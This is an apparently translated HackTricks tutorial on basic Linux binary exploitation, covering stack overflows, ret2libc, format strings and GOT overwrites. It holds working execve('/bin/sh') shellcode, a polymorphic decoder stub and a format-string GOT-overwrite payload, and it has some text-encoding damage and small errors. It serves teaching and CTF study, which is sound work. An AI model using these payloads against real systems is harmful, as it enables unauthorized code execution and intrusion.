# Explora√ß√£o no Linux (B√°sico)

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **1. ESTOUROS DE PILHA**

> estouro de buffer, sobrecarga de buffer, estouro de pilha, esmagamento de pilha

Segmentation fault ou viola√ß√£o de segmenta√ß√£o: Quando se tenta acessar um endere√ßo de mem√≥ria que n√£o foi atribu√≠do ao processo.

Para obter o endere√ßo de uma fun√ß√£o dentro de um programa, pode-se fazer:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### Chamada para sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

Ver interrup√ß√µes do kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; limpamos eax\
xor ebx, ebx ; ebx = 0 pois n√£o h√° argumento para passar\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Executar syscall

**nasm -f elf assembly.asm** ‚Äî> Retorna um .o\
**ld assembly.o -o shellcodeout** ‚Äî> Gera um execut√°vel com o c√≥digo assembly e podemos extrair os opcodes com **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Para verificar se √© realmente nosso shellcode e extrair os OpCodes

**Verificar se o shellcode funciona**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Para verificar se as chamadas de sistema est√£o sendo feitas corretamente, o programa anterior deve ser compilado e as chamadas de sistema devem aparecer em **strace ./PROGRAMA\_COMPILADO**

Ao criar shellcodes, um truque pode ser usado. A primeira instru√ß√£o √© um salto para uma chamada. A chamada chama o c√≥digo original e tamb√©m coloca o EIP na pilha. Ap√≥s a instru√ß√£o de chamada, inserimos a string necess√°ria, para que com esse EIP possamos apontar para a string e continuar executando o c√≥digo.

EXEMPLO **TRUQUE (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ usando o Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Ca√ßador de Ovos:**

Consiste em um pequeno c√≥digo que percorre as p√°ginas de mem√≥ria associadas a um processo em busca da shellcode ali armazenada (procura por alguma assinatura na shellcode). √ötil nos casos em que h√° apenas um pequeno espa√ßo para injetar c√≥digo.

**Shellcodes Polim√≥rficos**

Consistem em shells cifrados que possuem um pequeno c√≥digo que os descriptografa e salta para ele, usando o truque de Call-Pop, este seria um **exemplo de cifra de C√©sar**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
1. **Atacando o Frame Pointer (EBP)**

√ötil em uma situa√ß√£o em que podemos modificar o EBP, mas n√£o o EIP.

Sabe-se que ao sair de uma fun√ß√£o, o seguinte c√≥digo assembly √© executado:
```
movl               %ebp, %esp
popl                %ebp
ret
```
De esta forma, se pode modificar o EBP ao sair de uma fun√ß√£o (fvuln) que foi chamada por outra fun√ß√£o, quando a fun√ß√£o que chamou fvuln terminar, seu EIP pode ser modificado.

Em fvuln, pode-se introduzir um EBP falso que aponte para um local onde esteja o endere√ßo da shellcode + 4 (√© necess√°rio adicionar 4 por causa do pop). Assim, ao sair da fun√ß√£o, o valor de &(\&Shellcode)+4 ser√° colocado em ESP, com o pop, 4 ser√° subtra√≠do de ESP e ele apontar√° para o endere√ßo da shellcode quando o ret for executado.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + preenchimento + &(\&Shellcode)+4

**Exploit Off-by-One**\
Permite modificar apenas o byte menos significativo do EBP. Pode-se realizar um ataque como o anterior, mas a mem√≥ria que armazena o endere√ßo da shellcode deve compartilhar os 3 primeiros bytes com o EBP.

## **4. M√©todos return to Libc**

M√©todo √∫til quando o stack n√£o √© execut√°vel ou deixa um buffer muito pequeno para modificar.

O ASLR faz com que, em cada execu√ß√£o, as fun√ß√µes sejam carregadas em posi√ß√µes diferentes na mem√≥ria. Portanto, esse m√©todo pode n√£o ser eficaz nesse caso. Para servidores remotos, como o programa est√° sendo executado constantemente no mesmo endere√ßo, pode ser √∫til.

* **cdecl (C declaration)** Coloca os argumentos no stack e limpa a pilha ap√≥s sair da fun√ß√£o
* **stdcall (standard call)** Coloca os argumentos na pilha e √© a fun√ß√£o chamada que limpa a pilha
* **fastcall** Coloca os dois primeiros argumentos em registradores e o restante na pilha

√â colocado o endere√ßo da instru√ß√£o system da libc e √© passada como argumento a string ‚Äú/bin/sh‚Äù, normalmente de uma vari√°vel de ambiente. Al√©m disso, √© usada a dire√ß√£o da fun√ß√£o exit para que, uma vez que a shell n√£o seja mais necess√°ria, o programa saia sem problemas (e escreva logs).

**export SHELL=/bin/sh**

Para encontrar os endere√ßos necess√°rios, pode-se olhar dentro do **GDB:**\
**p system**\
**p exit**\
**rabin2 -i execut√°vel** ‚Äî> Fornece o endere√ßo de todas as fun√ß√µes usadas pelo programa ao ser carregado\
(Dentro de um start ou algum breakpoint): **x/500s $esp** ‚Äî> Procuramos aqui a string /bin/sh

Uma vez que tenhamos esses endere√ßos, o **exploit** ficaria assim:

‚ÄúA‚Äù \* DIST√ÇNCIA EBP + 4 (EBP: podem ser 4 "A"s, embora seja melhor se for o EBP real para evitar falhas de segmenta√ß√£o) + Endere√ßo do **system** (sobrescrever√° o EIP) + Endere√ßo do **exit** (ao sair de system(‚Äú/bin/sh‚Äù), esta fun√ß√£o ser√° chamada, pois os primeiros 4 bytes do stack s√£o tratados como o pr√≥ximo endere√ßo do EIP a ser executado) + Endere√ßo de ‚Äú**/bin/sh**‚Äù (ser√° o par√¢metro passado para system)

Dessa forma, o EIP ser√° sobrescrito com o endere√ßo de system, que receber√° a string ‚Äú/bin/sh‚Äù como par√¢metro e, ao sair disso, executar√° a fun√ß√£o exit().

√â poss√≠vel encontrar a situa√ß√£o em que algum byte de algum endere√ßo de alguma fun√ß√£o seja nulo ou espa√ßo (\x20). Nesse caso, pode-se desmontar os endere√ßos anteriores a essa fun√ß√£o, pois provavelmente haver√° v√°rios NOPs que permitir√£o chamar um deles em vez da fun√ß√£o diretamente (por exemplo, com > x/8i system-4).

Este m√©todo funciona porque, ao chamar uma fun√ß√£o como system usando o opcode **ret** em vez de **call**, a fun√ß√£o entende que os primeiros 4 bytes ser√£o o endere√ßo **EIP** para retornar.

Uma t√©cnica interessante com este m√©todo √© chamar **strncpy()** para mover um payload do stack para o heap e, posteriormente, usar **gets()** para executar esse payload.

Outra t√©cnica interessante √© o uso de **mprotect()**, que permite atribuir as permiss√µes desejadas a qualquer parte da mem√≥ria. Funciona ou funcionava no BDS, MacOS e OpenBSD, mas n√£o no Linux (controla que n√£o seja poss√≠vel conceder permiss√µes de escrita e execu√ß√£o ao mesmo tempo). Com esse ataque, seria poss√≠vel reconfigurar o stack como execut√°vel.

**Encadeamento de fun√ß√µes**

Com base na t√©cnica anterior, essa forma de exploit consiste em:\
Preenchimento + \&Fun√ß√£o1 + \&pop;ret; + \&arg\_fun1 + \&Fun√ß√£o2 + \&pop;ret; + \&arg\_fun2 + ‚Ä¶

Dessa forma, √© poss√≠vel encadear fun√ß√µes a serem chamadas. Al√©m disso, se desejar usar fun√ß√µes com v√°rios argumentos, pode-se colocar os argumentos necess√°rios (por exemplo, 4) e inserir os 4 argumentos e procurar um endere√ßo com opcodes: pop, pop, pop, pop, ret ‚Äî> **objdump -d execut√°vel**

**Encadeamento atrav√©s de falsifica√ß√£o de frames (encadeamento de EBPs)**

Consiste em aproveitar a capacidade de manipular o EBP para encadear a execu√ß√£o de v√°rias fun√ß√µes por meio do EBP e de "leave;ret"

PREENCHIMENTO

* Coloca-se no EBP um EBP falso que aponta para: 2¬∫ EBP\_falso + a fun√ß√£o a ser executada: (\&system() + \&leave;ret + &‚Äú/bin/sh‚Äù)
* No EIP, coloca-se como endere√ßo uma fun√ß√£o &(leave;ret)

Inicia-se a shellcode com o endere√ßo da pr√≥xima parte da shellcode, por exemplo: 2¬∫EBP\_falso + \&system() + &(leave;ret;) + &‚Äù/bin/sh‚Äù

o 2¬∫EBP seria: 3¬∫EBP\_falso + \&system() + &(leave;ret;) + &‚Äù/bin/ls‚Äù

Essa shellcode pode ser repetida indefinidamente nas partes da mem√≥ria √†s quais se tem acesso, de modo que uma shellcode facilmente divis√≠vel em pequenos peda√ßos de mem√≥ria seja obtida.

(A execu√ß√£o de fun√ß√µes √© encadeada misturando as vulnerabilidades vistas anteriormente de EBP e de ret2lib)

## **5. M√©todos complementares**

**Ret2Ret**

√ötil quando n√£o se pode inserir um endere√ßo do stack no EIP (verifica-se que o EIP n√£o cont√©m 0xbf) ou quando n√£o se pode calcular a localiza√ß√£o da shellcode. No entanto, a fun√ß√£o vulner√°vel aceita um par√¢metro (a shellcode ir√° aqui).

Dessa forma, ao alterar o EIP por um endere√ßo de um **ret**, a pr√≥xima dire√ß√£o ser√° carregada (que √© o endere√ßo do primeiro argumento da fun√ß√£o). Ou seja, a shellcode ser√° carregada.

O exploit seria: SHELLCODE + Preenchimento (at√© EIP) + **\&ret** (os pr√≥ximos bytes da pilha apontam para o in√≠cio da shellcode, pois o endere√ßo do argumento passado √© colocado na pilha)

Parece que fun√ß√µes como **strncpy**, uma vez completas, removem da pilha o endere√ßo onde a shellcode estava armazenada, impossibilitando essa t√©cnica. Ou seja, o endere√ßo passado para a fun√ß√£o como argumento (que armazena a shellcode) √© alterado por um 0x00, ent√£o, ao chamar o segundo **ret**, encontra um 0x00 e o programa falha.
```
**Ret2PopRet**
```
**T√©cnica de Murat**

Se n√£o tivermos controle sobre o primeiro argumento, mas tivermos sobre o segundo ou terceiro, podemos sobrescrever o EIP com um endere√ßo de pop-ret ou pop-pop-ret, conforme necess√°rio.

Em sistemas Linux, todos os programas s√£o mapeados a partir de 0xbfffffff.

Observando como a pilha de um novo processo √© constru√≠da no Linux, √© poss√≠vel desenvolver um exploit de modo que o programa seja iniciado em um ambiente onde a √∫nica vari√°vel seja a shellcode. O endere√ßo dela pode ser calculado como: addr = 0xbfffffff - 4 - strlen(NOME\_do\_execut√°vel\_completo) - strlen(shellcode)

Dessa forma, √© poss√≠vel obter facilmente o endere√ßo onde a vari√°vel de ambiente com a shellcode est√° localizada.

Isso √© vi√°vel devido √† fun√ß√£o execle, que permite criar um ambiente com apenas as vari√°veis de ambiente desejadas.

**Jump to ESP: Estilo Windows**

Como o ESP sempre aponta para o in√≠cio da pilha, essa t√©cnica consiste em substituir o EIP pelo endere√ßo de uma chamada a **jmp esp** ou **call esp**. Assim, a shellcode √© salva ap√≥s a sobrescrita do EIP, pois ap√≥s a execu√ß√£o do **ret**, o ESP estar√° apontando para o pr√≥ximo endere√ßo, onde a shellcode foi armazenada.

Caso o ASLR n√£o esteja ativado no Windows ou Linux, √© poss√≠vel chamar **jmp esp** ou **call esp** armazenadas em algum objeto compartilhado. Se o ASLR estiver ativado, pode-se procurar dentro do pr√≥prio programa vulner√°vel.

Al√©m disso, o fato de poder colocar a shellcode ap√≥s a corrup√ß√£o do EIP, em vez de no meio da pilha, permite que as instru√ß√µes push ou pop executadas no meio da fun√ß√£o n√£o afetem a shellcode (o que poderia ocorrer se estivesse no meio da pilha da fun√ß√£o).

De maneira semelhante, se soubermos que uma fun√ß√£o retorna o endere√ßo onde a shellcode est√° armazenada, √© poss√≠vel chamar **call eax** ou **jmp eax (ret2eax).**

**Estouros de Inteiros**

Esse tipo de estouro ocorre quando uma vari√°vel n√£o est√° preparada para suportar um n√∫mero t√£o grande quanto o fornecido, possivelmente devido a uma confus√£o entre vari√°veis com e sem sinal, por exemplo:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
No exemplo anterior, vemos que o programa espera 2 par√¢metros. O primeiro √© o comprimento da pr√≥xima string e o segundo √© a string.

Se passarmos um n√∫mero negativo como primeiro par√¢metro, ser√° exibido que len < 256 e passaremos por esse filtro, e tamb√©m strlen(buffer) ser√° menor que l, pois l √© um unsigned int e ser√° muito grande.

Esse tipo de overflow n√£o busca escrever algo no processo do programa, mas sim contornar filtros mal projetados para explorar outras vulnerabilidades.

**Vari√°veis n√£o inicializadas**

N√£o se sabe o valor que uma vari√°vel n√£o inicializada pode assumir e pode ser interessante observ√°-la. Pode ser que ela assuma o valor que uma vari√°vel da fun√ß√£o anterior assumia e que essa vari√°vel seja controlada pelo atacante.

## **Strings de Formato**

Em C, **`printf`** √© uma fun√ß√£o que pode ser usada para **imprimir** uma string. O **primeiro par√¢metro** que essa fun√ß√£o espera √© o **texto bruto com os formatadores**. Os **par√¢metros seguintes** esperados s√£o os **valores** para **substituir** os **formatadores** do texto bruto.

A vulnerabilidade ocorre quando um **texto do atacante √© colocado como o primeiro argumento** para essa fun√ß√£o. O atacante poder√° criar uma **entrada especial abusando** das **capacidades de string de formato do printf** para **escrever qualquer dado em qualquer endere√ßo**. Dessa forma, sendo capaz de **executar c√≥digo arbitr√°rio**.

Formatadores:
```bash
%08x ‚Äî> 8 hex bytes
%d ‚Äî> Entire
%u ‚Äî> Unsigned
%s ‚Äî> String
%n ‚Äî> Number of written bytes
%hn ‚Äî> Occupies 2 bytes instead of 4
<n>$X ‚Äî> Direct access, Example: ("%3$d", var1, var2, var3) ‚Äî> Access to var3
```
**`%n`** **escreve** o **n√∫mero de bytes escritos** no **endere√ßo indicado. Escrever** tantos **bytes** quanto o n√∫mero hexadecimal que precisamos **escrever** √© como voc√™ pode **escrever qualquer dado**.
```bash
AAAA%.6000d%4\$n ‚Äî> Write 6004 in the address indicated by the 4¬∫ param
AAAA.%500\$08x ‚Äî> Param at offset 500
```
### GOT (Tabela de Deslocamentos Globais) / PLT (Tabela de Liga√ß√£o de Procedimentos)

Esta √© a tabela que cont√©m o **endere√ßo** das **fun√ß√µes externas** usadas pelo programa.

Obtenha o endere√ßo desta tabela com: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

Observe como ap√≥s **carregar** o **execut√°vel** no GEF voc√™ pode **ver** as **fun√ß√µes** que est√£o na **GOT**: `gef‚û§ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

Usando o GEF, voc√™ pode **iniciar** uma **sess√£o de depura√ß√£o** e executar **`got`** para ver a tabela got:

![](<../../.gitbook/assets/image (621).png>)

Em um bin√°rio, a GOT tem os **endere√ßos das fun√ß√µes ou** da se√ß√£o **PLT** que carregar√° o endere√ßo da fun√ß√£o. O objetivo deste exploit √© **sobrescrever a entrada da GOT** de uma fun√ß√£o que ser√° executada posteriormente **com** o **endere√ßo** do PLT da fun√ß√£o **`system`**. Idealmente, voc√™ ir√° **sobrescrever** a **GOT** de uma **fun√ß√£o** que est√° **prestes a ser chamada com par√¢metros controlados por voc√™** (assim voc√™ poder√° controlar os par√¢metros enviados para a fun√ß√£o do sistema).

Se **`system`** **n√£o for usada** pelo script, a fun√ß√£o do sistema **n√£o** ter√° uma entrada na GOT. Nesse cen√°rio, voc√™ precisar√° **vazar primeiro o endere√ßo** da fun√ß√£o `system`.

A **Tabela de Liga√ß√£o de Procedimentos** √© uma tabela **somente leitura** no arquivo ELF que armazena todos os **s√≠mbolos necess√°rios que precisam de resolu√ß√£o**. Quando uma dessas fun√ß√µes √© chamada, a **GOT** ir√° **redirecionar** o **fluxo** para a **PLT** para que possa **resolver** o **endere√ßo** da fun√ß√£o e grav√°-lo na GOT.\
Ent√£o, na **pr√≥xima vez** que uma chamada for feita para esse endere√ßo, a **fun√ß√£o** √© **chamada diretamente** sem precisar resolv√™-la.

Voc√™ pode ver os endere√ßos da PLT com **`objdump -j .plt -d ./vuln_binary`**

### **Fluxo de Explora√ß√£o**

Como explicado anteriormente, o objetivo ser√° **sobrescrever** o **endere√ßo** de uma **fun√ß√£o** na **tabela GOT** que ser√° chamada posteriormente. Idealmente, poder√≠amos definir o **endere√ßo de um shellcode** localizado em uma se√ß√£o execut√°vel, mas √© altamente prov√°vel que voc√™ n√£o consiga escrever um shellcode em uma se√ß√£o execut√°vel.\
Ent√£o, uma op√ß√£o diferente √© **sobrescrever** uma **fun√ß√£o** que **recebe** seus **argumentos** do **usu√°rio** e **apont√°-la** para a **fun√ß√£o `system`**.

Para escrever o endere√ßo, geralmente s√£o feitos 2 passos: Voc√™ **escreve primeiro 2Bytes** do endere√ßo e depois os outros 2. Para fazer isso, √© usado **`$hn`**.

**HOB** √© chamado para os 2 bytes mais altos do endere√ßo\
**LOB** √© chamado para os 2 bytes mais baixos do endere√ßo

Assim, devido ao funcionamento da string de formato, voc√™ precisa **escrever primeiro o menor** de \[HOB, LOB\] e depois o outro.

Se HOB < LOB\
`[endere√ßo+2][endere√ßo]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Se HOB > LOB\
`[endere√ßo+2][endere√ßo]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 N¬∫Param\_dir\_HOB LOB\_shell-HOB\_shell N¬∫Param\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Modelo de Explora√ß√£o de String de Formato**

Voc√™ pode encontrar um **modelo** para explorar a GOT usando strings de formato aqui:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

Essencialmente, esta √© uma estrutura com **fun√ß√µes que ser√£o chamadas** antes do programa terminar. Isso √© interessante se voc√™ puder chamar seu **shellcode apenas pulando para um endere√ßo**, ou em casos em que voc√™ precisa voltar ao main novamente para **explorar a string de formato uma segunda vez**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Note que isso **n√£o** criar√° um **loop eterno** porque quando voc√™ voltar para o principal, o can√°rio perceber√°, o final da pilha pode estar corrompido e a fun√ß√£o n√£o ser√° chamada novamente. Portanto, com isso voc√™ poder√° **ter mais 1 execu√ß√£o** da vulnerabilidade.

### **Formatar Strings para Extrair Conte√∫do**

Uma string de formata√ß√£o tamb√©m pode ser abusada para **extrair conte√∫do** da mem√≥ria do programa.\
Por exemplo, na seguinte situa√ß√£o h√° uma **vari√°vel local na pilha apontando para uma flag**. Se voc√™ **encontrar** onde na **mem√≥ria** o **ponteiro** para a **flag** est√°, voc√™ pode fazer o **printf acessar** esse **endere√ßo** e **imprimir** a **flag**:

Ent√£o, a flag est√° em **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

E a partir do vazamento voc√™ pode ver que o **ponteiro para a flag** est√° no **8¬∫** par√¢metro:

![](<../../.gitbook/assets/image (623).png>)

Portanto, **acessando** o **8¬∫ par√¢metro** voc√™ pode obter a flag:

![](<../../.gitbook/assets/image (624).png>)

Note que seguindo o **exploit anterior** e percebendo que voc√™ pode **vazar conte√∫do**, voc√™ pode **definir ponteiros** para o **`printf`** na se√ß√£o onde o **execut√°vel** est√° **carregado** e **extrair** ele **inteiramente**!

### **DTOR**

{% hint style="danger" %}
Atualmente √© muito **raro encontrar um bin√°rio com uma se√ß√£o dtor**.
{% endhint %}

Os destrutores s√£o fun√ß√µes que s√£o **executadas antes do programa terminar**.\
Se voc√™ conseguir **escrever** um **endere√ßo** para um **shellcode** em **`__DTOR_END__`**, isso ser√° **executado** antes do programa terminar.\
Obtenha o endere√ßo desta se√ß√£o com:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
Normalmente voc√™ encontrar√° a se√ß√£o **DTOR** **entre** os valores `ffffffff` e `00000000`. Portanto, se voc√™ apenas ver esses valores, significa que **n√£o h√° nenhuma fun√ß√£o registrada**. Portanto, **sobrescreva** o **`00000000`** com o **endere√ßo** do **shellcode** para execut√°-lo.

### **Strings de Formato para Estouros de Buffer**

O **sprintf move** uma string formatada **para** uma **vari√°vel**. Portanto, voc√™ poderia abusar da **formata√ß√£o** de uma string para causar um **estouro de buffer na vari√°vel** para onde o conte√∫do √© copiado.\
Por exemplo, a carga √∫til `%.44xAAAA` ir√° **escrever 44B+"AAAA" na vari√°vel**, o que pode causar um estouro de buffer.

### **Estruturas \_\_atexit**

{% hint style="danger" %}
Atualmente √© muito **incomum explorar isso**.
{% endhint %}

**`atexit()`** √© uma fun√ß√£o para a qual **outras fun√ß√µes s√£o passadas como par√¢metros**. Essas **fun√ß√µes** ser√£o **executadas** ao executar um **`exit()`** ou o **retorno** do **main**.\
Se voc√™ puder **modificar** o **endere√ßo** de qualquer uma dessas **fun√ß√µes** para apontar para um shellcode, por exemplo, voc√™ **obter√° controle** do **processo**, mas isso √© atualmente mais complicado.\
Atualmente, os **endere√ßos das fun√ß√µes** a serem executadas est√£o **ocultos** atr√°s de v√°rias estruturas e, finalmente, o endere√ßo para o qual apontam n√£o s√£o os endere√ßos das fun√ß√µes, mas s√£o **criptografados com XOR** e deslocamentos com uma **chave aleat√≥ria**. Portanto, atualmente esse vetor de ataque n√£o √© muito √∫til, pelo menos em x86 e x64\_86.\
A **fun√ß√£o de criptografia** √© **`PTR_MANGLE`**. **Outras arquiteturas** como m68k, mips32, mips64, aarch64, arm, hppa... **n√£o implementam a fun√ß√£o de criptografia** porque **retornam o mesmo** que receberam como entrada. Portanto, essas arquiteturas seriam atac√°veis por esse vetor.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Atualmente √© muito **incomum explorar isso**.
{% endhint %}

**`Setjmp()`** permite **salvar** o **contexto** (os registradores)\
**`longjmp()`** permite **restaurar** o **contexto**.\
Os **registradores salvos** s√£o: `EBX, ESI, EDI, ESP, EIP, EBP`\
O que acontece √© que EIP e ESP s√£o passados pela fun√ß√£o **`PTR_MANGLE`**, ent√£o as **arquiteturas vulner√°veis a esse ataque s√£o as mesmas acima**.\
Eles s√£o √∫teis para recupera√ß√£o de erros ou interrup√ß√µes.\
No entanto, pelo que li, os outros registradores n√£o s√£o protegidos, **ent√£o se houver um `call ebx`, `call esi` ou `call edi`** dentro da fun√ß√£o chamada, o controle pode ser assumido. Ou voc√™ tamb√©m poderia modificar EBP para modificar o ESP.

**VTable e VPTR em C++**

Cada classe tem uma **Vtable** que √© um array de **ponteiros para m√©todos**.

Cada objeto de uma **classe** tem um **VPtr** que √© um **ponteiro** para o array de sua classe. O VPtr faz parte do cabe√ßalho de cada objeto, ent√£o se uma **sobrescrita** do **VPtr** for alcan√ßada, ela poderia ser **modificada** para **apontar** para um m√©todo fict√≠cio para que a execu√ß√£o de uma fun√ß√£o v√° para o shellcode.

## **Medidas preventivas e evas√µes**

**Return-into-printf**

√â uma t√©cnica para transformar um estouro de buffer em um erro de formata√ß√£o de string. Consiste em substituir o EIP para apontar para um printf da fun√ß√£o e passar uma string de formato manipulada como argumento para obter valores sobre o estado do processo.

**Ataque a bibliotecas**

As bibliotecas est√£o em uma posi√ß√£o com 16 bits de aleatoriedade = 65636 poss√≠veis endere√ßos. Se um servidor vulner√°vel chama fork(), o espa√ßo de endere√ßos de mem√≥ria √© clonado no processo filho e permanece intacto. Portanto, √© poss√≠vel tentar fazer uma for√ßa bruta na fun√ß√£o usleep() da libc passando "16" como argumento, de modo que quando demorar mais do que o normal para responder, a fun√ß√£o ser√° encontrada. Sabendo onde est√° essa fun√ß√£o, √© poss√≠vel obter delta\_mmap e calcular as demais.

A √∫nica maneira de ter certeza de que o ASLR funciona √© usando uma arquitetura de 64 bits. N√£o h√° ataques de for√ßa bruta l√°.

### Relro

**Relro (Read only Relocation)** afeta as permiss√µes de mem√≥ria de forma semelhante ao NX. A diferen√ßa √© que, enquanto com o NX torna a pilha execut√°vel, o RELRO torna **certas coisas somente leitura**, ent√£o **n√£o podemos escrever** nelas. A maneira mais comum que vi isso ser um obst√°culo √© nos impedindo de fazer uma **sobrescrita da tabela `got`**, que ser√° abordada posteriormente. A tabela `got` cont√©m endere√ßos de fun√ß√µes libc para que o bin√°rio saiba quais s√£o os endere√ßos e possa cham√°-los. Vamos ver como s√£o as permiss√µes de mem√≥ria para uma entrada da tabela `got` para um bin√°rio com e sem relro.

Com relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
